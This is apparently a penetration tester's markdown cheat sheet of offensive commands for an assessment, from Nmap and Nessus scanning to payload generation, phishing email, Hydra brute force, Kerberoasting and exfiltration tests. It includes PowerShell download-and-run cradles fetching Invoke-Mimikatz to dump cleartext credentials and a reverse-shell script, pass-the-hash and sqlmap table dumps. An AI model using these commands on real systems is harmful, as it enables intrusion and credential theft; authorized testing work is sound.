---
title: CISA Tools
---
# Network Reconnaissance

### NMAP
###### Ping Sweep
```
nmap -n -sn <x.x.x.x/xx or x.x.x.x-xxx> -oG - | awk '/Up$/{print $2}'
```
Take this ping sweep over to a targeted scan. You can replace the "--top-ports" with "-p-" or a list of desired ports. 
```
nmap --top-ports -sC -sV -oA nmap/targeted --script vuln "ipaddress from port scan"
```
###### Deeper Scanning
Run an Nmap scan for all tcp ports
```
nmap -p- --min-rate=1000 -T4 "ip address here" > output_nmap.txt
```
This information can be cleaned up a little with this. 
```
cat output_nmap.txt | grep ^[0-9] | cat output_nmap.txt |  cut -d '/' -f 1 |  tr '\n' ',' | sed s/,$//
```
##### My Favorite Nmap Scan
Thanks [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
```
nmap -sC -sV -oA nmap/init "ip address"
```
### Nessus
Start Nessus
```
service nessusd start
```
Browse to the https://<nessus host>:8834
* Username: root
* Password: toor
Create a new Advanced Scan
* Turn off ping
* Enable generic web application tests.

### SimplyEmail
### theHarvester

# Web Application Reconnaissance
### Vega
Open Vega by selecting the icon from the sidebar or menu in Kali.
### Acunetix
### Burp Suite
### Nessus
### Nikto
```
nikto -h "ip address"
```
### Nmap Scripting Engine

# Payload Generation
### Cobalt Strike
### MSFvenom
### Veil Framework
start Veil Framework navigate to the /Veil Framwork directory.
```
./Veil.py
```
If you have the ability to select between "Evasion and Ordnance" use Evasion. 
Run the "list" command to show Available Tools.
Use the 'python/meterpreter/rev_tcp.py' option from the list. Example below
```
use 28
```
The check the Required Options. 
```
options
```
Set the lhost ip address. 
Now you can Generate the payload. 



# Listeners
### Cobalt Strike
### Metasploit
### netcat

# Email Client
### Cobalt Strike
### SendEmail

```
sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
123.123.123.?:25 -u foo -a payload.py -m Click Me
```


# Enumeration
### PowerSploit

# Visual Inspection
### Aquatone
### EyeWitness

# Directory Bruce-Force
### DirBuster
### Gobuster

# Password Attacks
### hashcat
### Hydra
Hint: **Passwords formatted Season + year + punctuation are popular password options (in the case of this exercise, assume the year is 2018).** Example:
```
hydra -L domain_users.txt -P pwd_guesses.txt -o output.txt 10.10.10.10 smb.
```
### Kerberoast
When you have a Meterpreter shell on a target, you may be able to use the Kerberoast method to obtain crack-able strings from the target. 
```
load powershell
```
Then import PowerView.ps1 located in the '/root/Tools/PowerSploit/Recon'with the command.
```
powershell_import "/path/to/"PowerView.ps1
```
Open a PowerShell shell on the target using:
```
powershell_shell
```
So that you can run:
```
Invoke-Kerberoast | fl
```
If this method is successful, a hash or multiple hashes will be displayed in the output.

The format for the hashes is not ideal for cracking. To ensure it is formatted correctly for tools like hashcat, copy and paste the hash into a file (i.e. raw-kerberoast-hash) and run the following command: 
```
'cat raw-kerberoast-hash | tr -d ' \r\n’ > kerberoast-hash'.
```
### mimikatz

The Invoke-Mimikatz.ps1 script (located in 'root/Tools/PowerSploit/Exfiltration’) can be used to dump cleartext credentials on a target. To dump credentials on your target, run the following command: 'powershell -nop -ep bypass “IEX (New-Object Net.WebClient).DownloadString('http://<ip address of machine hosting the ps1 file>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds'. If successful, you will see cleartext passwords associated with usernames.

### Responder
Machines that don’t require SMB signing are vulnerable to SMB relaying.
```
responder -v -I eth0
```
### MultiRelay

Run from the "usr/share/responder/tools" directory: 
```
./MultiRelay.py -t 10.10.10.10 -u “Jane Doe"
```
Use the Available Commands after connection for interation options.
```
Available commands
```

### samdump2

If you are able to obtain SAM and System dumps (i.e. via smbclient or another method of access), a tool called samdump2 can be helpful in extracting hashes. Assuming your dumps are sam.dmp and sys.dmp, run the following command: 
```
samdump2 -o hash.dmp sys.dmp sam.dmp
```
Print the hash.dmp file when the function is complete to see the output.
### pth-winexe
Pass the Hash of a user and open a cmd shell. 
```
pth-winexe -u administrator%"hash"//"target ip" cmd.exe
```
# Exploitation/Privilege Escalation
### PowerSploit
The "PowerUp.ps1" script (located in "root/Tools/Powersploit/Privesc") can be used to automate the process of identifying Windows misconfigurations which are potential privilege escalation vectors. Additional research can be done to understand how to leverage the discovered misconfigurations, as methods may vary.
[ReadTeam_CheatSheet](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)

### Kerberoast 
### Burp Suite
### Metasploit
### SearchSploit
### sqlmap
create file from burp with loginin POST from burp suite - This is easier when done under the target usage --batch assume defaults good for background enumeration. 
```
sqlmap -r login.req -p id --level 5 --risk 3 --threads 10 --batch 
```
Basic sqlmap command usage
```
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" --dbs
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" --tables 
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" --columns 
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" -C "columnName" --dump
```
Manual testing for sqlmap can include using the following. 
```
http://site/name.php?henryearl=1
http://site/name.php?henryearl=1'
http://site/name.php?henryearl=-1
http://site/name.php?henryearl=-1'
```
[Thanks to Database Tutorials](https://www.youtube.com/watch?v=oWHKIiRGjtQ)

# Data Exfiltration
### Egress-Assess
In order to fulfill the data exfiltration service of an assessment, a tool called Egress-Assess is used. On the designated Egress-Assess server (the external Egress-Assess Kali machine) navigate to "root/Tools/Egress-Assess" and run: 
```
Egress-Assess.py --server "protocol"
```
For ftp and smtp protocols, specify a --username and --password that the client can use to connect and be sure to indicate those on the client as well. 


Once your server is set up, use the Egress-Assess client (the internal Egress-Assess Kali machine) and navigate to the "root/Tools/Egress-Assess" directory. Run the following command: 
```
/Egress-Assess.py --client <protocol> --ip <server ip address> --datatype ssn –data-size 15’.
```
Repeat this process for each of the protocols (http, https, ftp, icmp, smb, dns, smtp) and use the server output to determine if the data exfiltration was blocked or not. Use a smaller data size for DNS and ICMP protocols since they utilize a lot of packets. Include the results in your report.

# Windows Powershell
```
IEX(New-Object System.Net.WebClient).downloadString('http://"local ip"/Invoke-PowerShellTcp.ps1').  
```
# Kali Web Server
```
python3 -m htt.server 8080
```
```
python -m SimpleHTTPServer 8080
```
